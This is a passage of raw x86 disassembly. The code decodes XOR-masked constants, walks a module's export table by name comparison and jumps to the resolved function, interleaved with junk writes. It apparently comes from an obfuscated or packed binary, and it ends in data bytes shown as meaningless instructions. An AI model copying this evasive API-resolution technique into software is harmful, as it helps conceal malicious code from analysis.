  421979:	mov    DWORD PTR [ebp-0x108],0x2eeb
  421983:	mov    DWORD PTR [ebp-0x104],0x2108
  42198d:	mov    eax,DWORD PTR [ebp-0x1c]
  421990:	xor    edx,edx
  421992:	push   0x3
  421994:	pop    ecx
  421995:	div    ecx
  421997:	mov    ecx,DWORD PTR [ebp-0x40]
  42199a:	or     eax,ecx
  42199c:	mov    ecx,DWORD PTR [ebp-0x54]
  42199f:	xor    edx,edx
  4219a1:	div    ecx
  4219a3:	imul   eax,eax,0x7d53
  4219a9:	mov    ecx,DWORD PTR [ebp+0x8]
  4219ac:	lea    eax,[ecx+eax*1-0x1f534807]
  4219b3:	mov    ecx,DWORD PTR [ebp-0xf0]
  4219b9:	and    ecx,0x4108
  4219bf:	and    ecx,0x40e7
  4219c5:	sub    ecx,0x1a54
  4219cb:	xor    ecx,0x25ac
  4219d1:	mov    edx,DWORD PTR [ebp-0x104]
  4219d7:	xor    edx,0x6dda
  4219dd:	mov    esi,DWORD PTR [ebp-0x108]
  4219e3:	and    edx,esi
  4219e5:	and    edx,0xe0c
  4219eb:	or     edx,0x5b
  4219ee:	mov    esi,DWORD PTR [ebp-0xe8]
  4219f4:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  4219f8:	add    ecx,eax
  4219fa:	lea    eax,[edx+ecx*1-0xc5b]
  421a01:	mov    DWORD PTR [ebp-0xa8],eax
  421a07:	and    DWORD PTR [ebp-0x144],0x0
  421a0e:	jmp    0x421a20
  421a13:	mov    eax,DWORD PTR [ebp-0x144]
  421a19:	inc    eax
  421a1a:	mov    DWORD PTR [ebp-0x144],eax
  421a20:	mov    eax,DWORD PTR [ebp-0xe8]
  421a26:	mov    ecx,DWORD PTR [ebp-0x144]
  421a2c:	cmp    ecx,DWORD PTR [eax+0x18]
  421a2f:	je     0x421fe8
  421a35:	mov    eax,DWORD PTR [ebp-0x144]
  421a3b:	mov    ecx,DWORD PTR [ebp-0x38]
  421a3e:	mov    edx,DWORD PTR [ebp+0x8]
  421a41:	add    edx,DWORD PTR [ecx+eax*4]
  421a44:	mov    DWORD PTR [ebp-0x48],edx
  421a47:	mov    eax,DWORD PTR [ebp-0x48]
  421a4a:	mov    DWORD PTR [ebp-0x210],eax
  421a50:	mov    eax,DWORD PTR [ebp+0xc]
  421a53:	mov    DWORD PTR [ebp-0x20c],eax
  421a59:	mov    DWORD PTR [ebp-0x1f0],0xca79a575
  421a63:	mov    DWORD PTR [ebp-0x1ec],0x9c1b89e8
  421a6d:	mov    DWORD PTR [ebp-0x1e0],0xca79a571
  421a77:	mov    DWORD PTR [ebp-0x1dc],0x9c1b89e8
  421a81:	lea    eax,[ebp-0x1e8]
  421a87:	mov    DWORD PTR [ebp-0x1f4],eax
  421a8d:	mov    eax,DWORD PTR [ebp-0x20c]
  421a93:	movzx  eax,WORD PTR [eax+0x20]
  421a97:	xor    eax,0xa49b
  421a9c:	movzx  eax,ax
  421a9f:	sar    eax,1
  421aa1:	mov    ecx,DWORD PTR [ebp-0x20c]
  421aa7:	movzx  ecx,WORD PTR [ecx+0x20]
  421aab:	xor    ecx,0xa49b
  421ab1:	movzx  ecx,cx
  421ab4:	shl    ecx,0xf
  421ab7:	or     eax,ecx
  421ab9:	movzx  eax,ax
  421abc:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421ac2:	mov    DWORD PTR [ecx],eax
  421ac4:	mov    eax,DWORD PTR [ebp-0x1e0]
  421aca:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ad0:	xor    eax,0xca79a575
  421ad5:	xor    edx,0x9c1b89e8
  421adb:	mov    cl,0x2
  421add:	call   0x40a9b5
  421ae2:	mov    ebx,eax
  421ae4:	mov    esi,edx
  421ae6:	mov    eax,DWORD PTR [ebp-0x1e0]
  421aec:	mov    edx,DWORD PTR [ebp-0x1dc]
  421af2:	xor    eax,0xca79a575
  421af7:	xor    edx,0x9c1b89e8
  421afd:	mov    cl,0x3e
  421aff:	call   0x42227c
  421b04:	or     ebx,eax
  421b06:	or     esi,edx
  421b08:	movzx  eax,bl
  421b0b:	push   eax
  421b0c:	lea    eax,[ebp-0x198]
  421b12:	push   eax
  421b13:	call   0x416c9e
  421b18:	mov    eax,DWORD PTR [ebp-0x1f0]
  421b1e:	mov    edx,DWORD PTR [ebp-0x1ec]
  421b24:	xor    eax,0xca79a575
  421b29:	xor    edx,0x9c1b89e8
  421b2f:	mov    cl,0x2
  421b31:	call   0x40a9b5
  421b36:	mov    esi,eax
  421b38:	mov    edi,edx
  421b3a:	mov    eax,DWORD PTR [ebp-0x1f0]
  421b40:	mov    edx,DWORD PTR [ebp-0x1ec]
  421b46:	xor    eax,0xca79a575
  421b4b:	xor    edx,0x9c1b89e8
  421b51:	mov    cl,0x3e
  421b53:	call   0x42227c
  421b58:	or     esi,eax
  421b5a:	or     edi,edx
  421b5c:	mov    DWORD PTR [ebp-0x1f8],esi
  421b62:	jmp    0x421bb7
  421b67:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b6d:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b73:	xor    eax,0xca79a575
  421b78:	xor    edx,0x9c1b89e8
  421b7e:	mov    cl,0x2
  421b80:	call   0x40a9b5
  421b85:	mov    esi,eax
  421b87:	mov    edi,edx
  421b89:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b8f:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b95:	xor    eax,0xca79a575
  421b9a:	xor    edx,0x9c1b89e8
  421ba0:	mov    cl,0x3e
  421ba2:	call   0x42227c
  421ba7:	or     esi,eax
  421ba9:	or     edi,edx
  421bab:	add    esi,DWORD PTR [ebp-0x1f8]
  421bb1:	mov    DWORD PTR [ebp-0x1f8],esi
  421bb7:	mov    eax,DWORD PTR [ebp-0x1e8]
  421bbd:	cmp    DWORD PTR [ebp-0x1f8],eax
  421bc3:	je     0x421c56
  421bc9:	mov    eax,DWORD PTR [ebp-0x1f8]
  421bcf:	mov    ecx,DWORD PTR [ebp-0x20c]
  421bd5:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  421bda:	xor    eax,0xa49b
  421bdf:	movzx  eax,ax
  421be2:	sar    eax,1
  421be4:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421bea:	mov    edx,DWORD PTR [ebp-0x20c]
  421bf0:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421bf5:	xor    ecx,0xa49b
  421bfb:	movzx  ecx,cx
  421bfe:	shl    ecx,0xf
  421c01:	or     eax,ecx
  421c03:	movzx  eax,ax
  421c06:	mov    DWORD PTR [ebp-0x1fc],eax
  421c0c:	mov    eax,DWORD PTR [ebp-0x1f8]
  421c12:	mov    ecx,DWORD PTR [ebp-0x20c]
  421c18:	movzx  eax,WORD PTR [ecx+eax*4]
  421c1c:	xor    eax,0xa49b
  421c21:	movzx  eax,ax
  421c24:	sar    eax,1
  421c26:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421c2c:	mov    edx,DWORD PTR [ebp-0x20c]
  421c32:	movzx  ecx,WORD PTR [edx+ecx*4]
  421c36:	xor    ecx,0xa49b
  421c3c:	movzx  ecx,cx
  421c3f:	shl    ecx,0xf
  421c42:	or     eax,ecx
  421c44:	mov    ecx,DWORD PTR [ebp-0x1fc]
  421c4a:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421c51:	jmp    0x421b67
  421c56:	mov    eax,DWORD PTR [ebp-0x1f0]
  421c5c:	mov    edx,DWORD PTR [ebp-0x1ec]
  421c62:	xor    eax,0xca79a575
  421c67:	xor    edx,0x9c1b89e8
  421c6d:	mov    cl,0x2
  421c6f:	call   0x40a9b5
  421c74:	mov    esi,eax
  421c76:	mov    edi,edx
  421c78:	mov    eax,DWORD PTR [ebp-0x1f0]
  421c7e:	mov    edx,DWORD PTR [ebp-0x1ec]
  421c84:	xor    eax,0xca79a575
  421c89:	xor    edx,0x9c1b89e8
  421c8f:	mov    cl,0x3e
  421c91:	call   0x42227c
  421c96:	or     esi,eax
  421c98:	or     edi,edx
  421c9a:	mov    DWORD PTR [ebp-0x1e4],esi
  421ca0:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ca6:	mov    edx,DWORD PTR [ebp-0x1dc]
  421cac:	xor    eax,0xca79a575
  421cb1:	xor    edx,0x9c1b89e8
  421cb7:	mov    cl,0x2
  421cb9:	call   0x40a9b5
  421cbe:	mov    esi,eax
  421cc0:	mov    edi,edx
  421cc2:	mov    eax,DWORD PTR [ebp-0x1e0]
  421cc8:	mov    edx,DWORD PTR [ebp-0x1dc]
  421cce:	xor    eax,0xca79a575
  421cd3:	xor    edx,0x9c1b89e8
  421cd9:	mov    cl,0x3e
  421cdb:	call   0x42227c
  421ce0:	or     esi,eax
  421ce2:	or     edi,edx
  421ce4:	mov    DWORD PTR [ebp-0x23c],esi
  421cea:	mov    DWORD PTR [ebp-0x238],edi
  421cf0:	mov    eax,DWORD PTR [ebp-0x23c]
  421cf6:	or     eax,DWORD PTR [ebp-0x238]
  421cfc:	je     0x421f5c
  421d02:	lea    eax,[ebp-0x204]
  421d08:	mov    DWORD PTR [ebp-0x208],eax
  421d0e:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d14:	xor    edx,edx
  421d16:	mov    cl,0x2
  421d18:	call   0x42227c
  421d1d:	mov    esi,eax
  421d1f:	mov    edi,edx
  421d21:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d27:	xor    edx,edx
  421d29:	mov    cl,0x3e
  421d2b:	call   0x40a9b5
  421d30:	or     esi,eax
  421d32:	or     edi,edx
  421d34:	xor    esi,0xca79a575
  421d3a:	xor    edi,0x9c1b89e8
  421d40:	mov    eax,DWORD PTR [ebp-0x208]
  421d46:	mov    DWORD PTR [eax],esi
  421d48:	mov    DWORD PTR [eax+0x4],edi
  421d4b:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d51:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421d59:	mov    eax,DWORD PTR [ebp-0x1e0]
  421d5f:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d65:	xor    eax,0xca79a575
  421d6a:	xor    edx,0x9c1b89e8
  421d70:	mov    cl,0x2
  421d72:	call   0x40a9b5
  421d77:	mov    ebx,eax
  421d79:	mov    edi,edx
  421d7b:	mov    eax,DWORD PTR [ebp-0x1e0]
  421d81:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d87:	xor    eax,0xca79a575
  421d8c:	xor    edx,0x9c1b89e8
  421d92:	mov    cl,0x3e
  421d94:	call   0x42227c
  421d99:	or     ebx,eax
  421d9b:	or     edi,edx
  421d9d:	movsx  eax,bl
  421da0:	cmp    esi,eax
  421da2:	je     0x421f02
  421da8:	mov    eax,DWORD PTR [ebp-0x1e4]
  421dae:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421db6:	mov    eax,DWORD PTR [ebp-0x204]
  421dbc:	mov    edx,DWORD PTR [ebp-0x200]
  421dc2:	xor    eax,0xca79a575
  421dc7:	xor    edx,0x9c1b89e8
  421dcd:	mov    cl,0x2
  421dcf:	call   0x40a9b5
  421dd4:	mov    edi,eax
  421dd6:	mov    ebx,edx
  421dd8:	mov    eax,DWORD PTR [ebp-0x204]
  421dde:	mov    edx,DWORD PTR [ebp-0x200]
  421de4:	xor    eax,0xca79a575
  421de9:	xor    edx,0x9c1b89e8
  421def:	mov    cl,0x3e
  421df1:	call   0x42227c
  421df6:	or     edi,eax
  421df8:	or     ebx,edx
  421dfa:	mov    eax,DWORD PTR [ebp-0x210]
  421e00:	movsx  eax,BYTE PTR [eax+edi*1]
  421e04:	cmp    esi,eax
  421e06:	je     0x421e16
  421e0c:	jmp    0x421f5c
  421e11:	jmp    0x421f02
  421e16:	mov    eax,DWORD PTR [ebp-0x204]
  421e1c:	mov    edx,DWORD PTR [ebp-0x200]
  421e22:	xor    eax,0xca79a575
  421e27:	xor    edx,0x9c1b89e8
  421e2d:	mov    cl,0x2
  421e2f:	call   0x40a9b5
  421e34:	mov    esi,eax
  421e36:	mov    edi,edx
  421e38:	mov    eax,DWORD PTR [ebp-0x204]
  421e3e:	mov    edx,DWORD PTR [ebp-0x200]
  421e44:	xor    eax,0xca79a575
  421e49:	xor    edx,0x9c1b89e8
  421e4f:	mov    cl,0x3e
  421e51:	call   0x42227c
  421e56:	or     esi,eax
  421e58:	or     edi,edx
  421e5a:	mov    eax,DWORD PTR [ebp-0x210]
  421e60:	movsx  esi,BYTE PTR [eax+esi*1]
  421e64:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e6a:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e70:	xor    eax,0xca79a575
  421e75:	xor    edx,0x9c1b89e8
  421e7b:	mov    cl,0x2
  421e7d:	call   0x40a9b5
  421e82:	mov    ebx,eax
  421e84:	mov    edi,edx
  421e86:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e8c:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e92:	xor    eax,0xca79a575
  421e97:	xor    edx,0x9c1b89e8
  421e9d:	mov    cl,0x3e
  421e9f:	call   0x42227c
  421ea4:	or     ebx,eax
  421ea6:	or     edi,edx
  421ea8:	movsx  eax,bl
  421eab:	cmp    esi,eax
  421ead:	jne    0x421f02
  421eb3:	mov    eax,DWORD PTR [ebp-0x1e0]
  421eb9:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ebf:	xor    eax,0xca79a575
  421ec4:	xor    edx,0x9c1b89e8
  421eca:	mov    cl,0x2
  421ecc:	call   0x40a9b5
  421ed1:	mov    esi,eax
  421ed3:	mov    edi,edx
  421ed5:	mov    eax,DWORD PTR [ebp-0x1e0]
  421edb:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ee1:	xor    eax,0xca79a575
  421ee6:	xor    edx,0x9c1b89e8
  421eec:	mov    cl,0x3e
  421eee:	call   0x42227c
  421ef3:	or     esi,eax
  421ef5:	or     edi,edx
  421ef7:	mov    DWORD PTR [ebp-0x214],esi
  421efd:	jmp    0x421fa6
  421f02:	mov    eax,DWORD PTR [ebp-0x1e0]
  421f08:	mov    edx,DWORD PTR [ebp-0x1dc]
  421f0e:	xor    eax,0xca79a575
  421f13:	xor    edx,0x9c1b89e8
  421f19:	mov    cl,0x2
  421f1b:	call   0x40a9b5
  421f20:	mov    esi,eax
  421f22:	mov    edi,edx
  421f24:	mov    eax,DWORD PTR [ebp-0x1e0]
  421f2a:	mov    edx,DWORD PTR [ebp-0x1dc]
  421f30:	xor    eax,0xca79a575
  421f35:	xor    edx,0x9c1b89e8
  421f3b:	mov    cl,0x3e
  421f3d:	call   0x42227c
  421f42:	or     esi,eax
  421f44:	or     edi,edx
  421f46:	add    esi,DWORD PTR [ebp-0x1e4]
  421f4c:	mov    DWORD PTR [ebp-0x1e4],esi
  421f52:	jmp    0x421ca0
  421f57:	jmp    0x421ca0
  421f5c:	mov    eax,DWORD PTR [ebp-0x1f0]
  421f62:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f68:	xor    eax,0xca79a575
  421f6d:	xor    edx,0x9c1b89e8
  421f73:	mov    cl,0x2
  421f75:	call   0x40a9b5
  421f7a:	mov    esi,eax
  421f7c:	mov    edi,edx
  421f7e:	mov    eax,DWORD PTR [ebp-0x1f0]
  421f84:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f8a:	xor    eax,0xca79a575
  421f8f:	xor    edx,0x9c1b89e8
  421f95:	mov    cl,0x3e
  421f97:	call   0x42227c
  421f9c:	or     esi,eax
  421f9e:	or     edi,edx
  421fa0:	mov    DWORD PTR [ebp-0x214],esi
  421fa6:	mov    eax,DWORD PTR [ebp-0x214]
  421fac:	mov    DWORD PTR [ebp-0xc8],eax
  421fb2:	cmp    DWORD PTR [ebp-0xc8],0x0
  421fb9:	je     0x421fe3
  421fbf:	mov    eax,DWORD PTR [ebp-0x144]
  421fc5:	mov    ecx,DWORD PTR [ebp-0xac]
  421fcb:	movzx  eax,WORD PTR [ecx+eax*2]
  421fcf:	mov    ecx,DWORD PTR [ebp-0xa8]
  421fd5:	mov    eax,DWORD PTR [ecx+eax*4]
  421fd8:	mov    DWORD PTR [ebp-0xfc],eax
  421fde:	jmp    0x421fe8
  421fe3:	jmp    0x421a13
  421fe8:	cmp    DWORD PTR [ebp-0xfc],0x0
  421fef:	jne    0x421ffc
  421ff5:	xor    eax,eax
  421ff7:	jmp    0x422275
  421ffc:	mov    eax,DWORD PTR [ebp+0x8]
  421fff:	add    eax,DWORD PTR [ebp-0xfc]
  422005:	mov    DWORD PTR [ebp-0xec],eax
  42200b:	mov    DWORD PTR [ebp-0x74],0x0
  422012:	cmp    DWORD PTR [ebp-0xb0],0x0
  422019:	je     0x422095
  42201f:	cmp    DWORD PTR [ebp-0xb0],0x0
  422026:	je     0x422095
  42202c:	mov    eax,DWORD PTR [ebp-0xb0]
  422032:	shl    eax,0x2
  422035:	mov    DWORD PTR [ebp-0x74],eax
  422038:	mov    DWORD PTR [ebp-0x14c],0x0
  422042:	sub    esp,DWORD PTR [ebp-0x74]
  422045:	mov    DWORD PTR [ebp-0x14c],esp
  42204b:	mov    DWORD PTR [ebp-0x148],0x0
  422055:	mov    eax,DWORD PTR [ebp-0x148]
  42205b:	cmp    eax,DWORD PTR [ebp-0xb0]
  422061:	je     0x422095
  422067:	mov    eax,DWORD PTR [ebp-0x148]
  42206d:	mov    ecx,DWORD PTR [ebp-0x14c]
  422073:	mov    edx,DWORD PTR [ebp-0x148]
  422079:	mov    esi,DWORD PTR [ebp+0x14]
  42207c:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  422080:	mov    DWORD PTR [ecx+eax*4],edx
  422083:	mov    eax,DWORD PTR [ebp-0x148]
  422089:	inc    eax
  42208a:	mov    DWORD PTR [ebp-0x148],eax
  422090:	jmp    0x422055
  422095:	mov    DWORD PTR [ebp-0x9c],0x0
  42209f:	push   0x42222e
  4220a4:	jmp    DWORD PTR [ebp-0xec]
  4220aa:	mov    eax,eax
  4220ac:	mov    ecx,esp
  4220ae:	ret    0xc
  4220b1:	cmp    DWORD PTR ds:0x42833f,0x0
  4220b8:	mov    DWORD PTR ds:0x42833b,0x7476
  4220c2:	mov    DWORD PTR ds:0x4281b7,0x1cdc
  4220cc:	mov    DWORD PTR ds:0x42833b,0x65fa
  4220d6:	mov    DWORD PTR ds:0x4281a7,0x5dca
  4220e0:	jmp    0x42212a
  4220e5:	mov    eax,ds:0x428337
  4220ea:	cmp    DWORD PTR ds:0x42833f,0x0
  4220f1:	jbe    0x422112
  4220f7:	push   0x24f1
  4220fc:	call   DWORD PTR ds:0x428db8
  422102:	inc    DWORD PTR ds:0x4283e3
  422108:	sub    DWORD PTR ds:0x4281c3,0x46d9
  422112:	inc    DWORD PTR ds:0x42833f
  422118:	adc    DWORD PTR ds:0x42834b,ebx
  42211e:	or     DWORD PTR ds:0x428273,0x4029
  422128:	not    eax
  42212a:	push   ebx
  42212b:	push   esi
  42212c:	sbb    DWORD PTR ds:0x4283cf,edx
  422132:	mov    eax,DWORD PTR [esp+0x18]
  422136:	or     eax,eax
  422138:	jne    0x422168
  42213e:	mov    ecx,DWORD PTR [esp+0x14]
  422142:	mov    eax,DWORD PTR [esp+0x10]
  422146:	xor    edx,edx
  422148:	div    ecx
  42214a:	xor    DWORD PTR ds:0x4281cf,0x45f1
  422154:	mov    ebx,eax
  422156:	mov    eax,DWORD PTR [esp+0xc]
  42215a:	div    ecx
  42215c:	mov    edx,0x36e3
  422161:	mov    edx,ebx
  422163:	jmp    0x422229
  422168:	mov    ecx,eax
  42216a:	sbb    eax,0x67a9
  42216f:	mov    ebx,DWORD PTR [esp+0x14]
  422173:	cmp    DWORD PTR ds:0x428337,0x0
  42217a:	mov    edx,DWORD PTR ds:0x4283e7
  422180:	mov    DWORD PTR ds:0x428367,0x4bc7
  42218a:	mov    edx,DWORD PTR ds:0x42834f
  422190:	jmp    0x4221da
  422195:	mov    DWORD PTR ds:0x428297,0x15f
  42219f:	mov    DWORD PTR ds:0x4282cf,0x4dd1
  4221a9:	cmp    DWORD PTR ds:0x428337,0x0
  4221b0:	jle    0x4221cd
  4221b6:	push   0x824e
  4221bb:	call   DWORD PTR ds:0x428dbc
  4221c1:	xor    DWORD PTR ds:0x42834f,0x6c44
  4221cb:	sub    edx,edx
  4221cd:	sbb    DWORD PTR ds:0x428297,0x445e
  4221d7:	dec    edx
  4221d8:	not    edx
  4221da:	mov    edx,DWORD PTR [esp+0x10]
  4221de:	mov    eax,DWORD PTR [esp+0xc]
  4221e2:	shr    ecx,1
  4221e4:	rcr    ebx,1
  4221e6:	shr    edx,1
  4221e8:	rcr    eax,1
  4221ea:	or     ecx,ecx
  4221ec:	jne    0x4221e2
  4221f2:	div    ebx
  4221f4:	mov    esi,eax
  4221f6:	mul    DWORD PTR [esp+0x18]
  4221fa:	mov    ecx,eax
  4221fc:	mov    eax,DWORD PTR [esp+0x14]
  422200:	mul    esi
  422202:	add    edx,ecx
  422204:	jb     0x422224
  42220a:	cmp    edx,DWORD PTR [esp+0x10]
  42220e:	ja     0x422224
  422214:	jb     0x422225
  42221a:	cmp    eax,DWORD PTR [esp+0xc]
  42221e:	jbe    0x422225
  422224:	dec    esi
  422225:	xor    edx,edx
  422227:	mov    eax,esi
  422229:	pop    esi
  42222a:	pop    ebx
  42222b:	ret    0x10
  42222e:	or     DWORD PTR ds:0x4283b3,0x4283bf
  422238:	sub    DWORD PTR [ebp+0x10],0x1
  42223c:	mov    DWORD PTR ds:0x4281bb,0x43bf
  422246:	cmp    DWORD PTR [ebp+0x10],0x0
  42224a:	mov    DWORD PTR ds:0x4283ab,0x612a
  422254:	je     0x422263
  42225a:	xor    DWORD PTR ds:0x4281a7,edx
  422260:	add    esp,DWORD PTR [ebp-0x74]
  422263:	mov    DWORD PTR [ebp-0x9c],eax
  422269:	mov    DWORD PTR ds:0x4282af,ebx
  42226f:	mov    eax,DWORD PTR [ebp-0x9c]
  422275:	pop    edi
  422276:	pop    esi
  422277:	pop    ebx
  422278:	leave  
  422279:	ret    0x10
  42227c:	cmp    cl,0x40
  42227f:	mov    DWORD PTR ds:0x428293,0x43a8
  422289:	jae    0x4222db
  42228f:	mov    DWORD PTR ds:0x4281c7,0x42f2
  422299:	cmp    cl,0x20
  42229c:	mov    DWORD PTR ds:0x4281af,0x3d58
  4222a6:	jae    0x4222c6
  4222ac:	or     DWORD PTR ds:0x4281a3,0x5e1e
  4222b6:	shld   edx,eax,cl
  4222b9:	mov    DWORD PTR ds:0x4282c7,0x1bd2
  4222c3:	shl    eax,cl
  4222c5:	ret    
  4222c6:	inc    edx
  4222c7:	mov    edx,eax
  4222c9:	sub    DWORD PTR ds:0x4283e3,0x42833b
  4222d3:	xor    eax,eax
  4222d5:	and    cl,0x1f
  4222d8:	shl    edx,cl
  4222da:	ret    
  4222db:	xor    eax,eax
  4222dd:	xor    edx,edx
  4222df:	ret    
  4222e0:	jmp    0x3c568e20
  4222e5:	es sub al,0x44
  4222e8:	jno    0x422353
  4222ea:	ja     0x422351
  4222ec:	int3   
  4222ed:	fsubr  QWORD PTR [edx+0x1e]
  4222f0:	jo     0x422357
  4222f2:	popa   
  4222f3:	ins    BYTE PTR es:[edi],dx
  4222f4:	push   eax
  4222f5:	lods   eax,DWORD PTR ds:[esi]
  4222f6:	xor    DWORD PTR [esi+0x41],edi
  4222f9:	ins    BYTE PTR es:[edi],dx
  4222fa:	popa   
  4222fb:	outs   dx,BYTE PTR ds:[esi]
  4222fc:	add    BYTE PTR [eax],al
  4222fe:	add    BYTE PTR [eax],al
  422300:	addr16 jb 0x422368
  422303:	popa   
  422304:	je     0x42236d
  422306:	jb     0x42236d
  422308:	popa   
  422309:	je     0x422372
  42230b:	jb     0x422372
  42230d:	popa   
  42230e:	je     0x422377
  422310:	jb     0x422377
  422312:	popa   
  422313:	je     0x42237c
  422315:	jb     0x42237c
  422317:	popa   
  422318:	je     0x422381
  42231a:	jb     0x422381
  42231c:	popa   
  42231d:	je     0x422386
  42231f:	jb     0x422386
  422321:	popa   
  422322:	je     0x42238b
  422324:	jb     0x42238b
  422326:	popa   
  422327:	je     0x422390
  422329:	jb     0x422390
  42232b:	popa   
  42232c:	je     0x422395
  42232e:	jb     0x422395
  422330:	popa   
  422331:	je     0x422333
  422333:	add    BYTE PTR [eax+0x65],ch
  422336:	ins    BYTE PTR es:[edi],dx
  422337:	ins    BYTE PTR es:[edi],dx
  422338:	push   0x686c6c65
  42233d:	gs ins BYTE PTR es:[edi],dx
  42233f:	ins    BYTE PTR es:[edi],dx
  422340:	push   0x686c6c65
  422345:	gs ins BYTE PTR es:[edi],dx
  422347:	ins    BYTE PTR es:[edi],dx
  422348:	push   0x686c6c65
  42234d:	gs ins BYTE PTR es:[edi],dx
  42234f:	ins    BYTE PTR es:[edi],dx
  422350:	push   0x686c6c65
  422355:	gs ins BYTE PTR es:[edi],dx
  422357:	ins    BYTE PTR es:[edi],dx
  422358:	push   0x686c6c65
  42235d:	gs ins BYTE PTR es:[edi],dx
  42235f:	ins    BYTE PTR es:[edi],dx
  422360:	push   0x686c6c65
  422365:	gs ins BYTE PTR es:[edi],dx
  422367:	ins    BYTE PTR es:[edi],dx
  422368:	add    BYTE PTR [eax],al
  42236a:	add    BYTE PTR [eax],al
  42236c:	outs   dx,DWORD PTR ds:[esi]
  42236d:	add    BYTE PTR [eax+eax*1+0x65],ch
  422371:	add    BYTE PTR [ecx+0x0],ah
  422374:	jne    0x422376
  422376:	je     0x422378
  422378:	xor    eax,DWORD PTR [eax]
  42237a:	xor    al,BYTE PTR [eax]
  42237c:	add    BYTE PTR [eax],al
  42237e:	add    BYTE PTR [eax],al
  422380:	push   0x61006500
  422385:	add    BYTE PTR [esi+0x0],dh
  422388:	add    BYTE PTR gs:[esi+0x0],ch
  42238c:	push   0x61006500
  422391:	add    BYTE PTR [esi+0x0],dh
  422394:	add    BYTE PTR gs:[esi+0x0],ch
  422398:	push   0x61006500
  42239d:	add    BYTE PTR [esi+0x0],dh
  4223a0:	add    BYTE PTR gs:[esi+0x0],ch
  4223a4:	push   0x61006500
  4223a9:	add    BYTE PTR [esi+0x0],dh
  4223ac:	add    BYTE PTR gs:[esi+0x0],ch
  4223b0:	push   0x61006500
  4223b5:	add    BYTE PTR [esi+0x0],dh
  4223b8:	add    BYTE PTR gs:[esi+0x0],ch
  4223bc:	push   0x61006500
  4223c1:	add    BYTE PTR [esi+0x0],dh
  4223c4:	add    BYTE PTR gs:[esi+0x0],ch
  4223c8:	push   0x61006500
  4223cd:	add    BYTE PTR [esi+0x0],dh
  4223d0:	add    BYTE PTR gs:[esi+0x0],ch
  4223d4:	push   0x61006500
  4223d9:	add    BYTE PTR [esi+0x0],dh
  4223dc:	add    BYTE PTR gs:[esi+0x0],ch
  4223e0:	push   0x61006500
  4223e5:	add    BYTE PTR [esi+0x0],dh
  4223e8:	add    BYTE PTR gs:[esi+0x0],ch
  4223ec:	add    BYTE PTR [eax],al
  4223ee:	add    BYTE PTR [eax],al
  4223f0:	ins    BYTE PTR es:[edi],dx
  4223f1:	and    eax,DWORD PTR [edx+0x0]
  4223f4:	dec    edi
  4223f5:	ins    BYTE PTR es:[edi],dx
  4223f6:	gs dec ecx
  4223f8:	arpl   WORD PTR [edi+0x6e],bp
  4223fb:	push   esp
  4223fc:	outs   dx,DWORD PTR ds:[esi]
  4223fd:	inc    ebx
  4223fe:	jne    0x422472
  422400:	jae    0x422471
  422402:	jb     0x422404
  422404:	hlt    
  422405:	and    eax,DWORD PTR [edx+0x0]
	...
  422410:	mov    al,0x27
  422412:	inc    edx
  422413:	add    BYTE PTR [eax+0x70004227],bh
  422419:	es inc edx
  42241b:	add    dl,dh
  42241d:	inc    ebx
  42241e:	push   ebx
  42241f:	mov    WORD PTR ds:0x1a49ba4,ss
  422425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422426:	popf   
  422427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422428:	jno    0x4223ce
  42242a:	xchg   edi,eax
  42242b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42242c:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  422433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422434:	sbb    DWORD PTR [ebp+eax*4-0x445b645c],esp
  42243b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42243c:	rol    DWORD PTR [edx-0x5b6a732f],cl
  422442:	adc    eax,0x1a49ba4
  422447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422448:	popf   
  422449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42244a:	jno    0x4223f0
  42244c:	xchg   edi,eax
  42244d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42244e:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  422455:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422456:	xor    eax,0x9ba485a4
  42245b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42245c:	mov    ebx,0xd1e2d3a4
  422461:	in     al,dx
  422462:	xchg   ebp,eax
  422463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422464:	adc    eax,0x3ba49ba4
  422469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246a:	popf   
  42246b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246c:	sbb    DWORD PTR [ebp+edx*4-0x705b805c],esp
  422473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422474:	fwait
  422475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
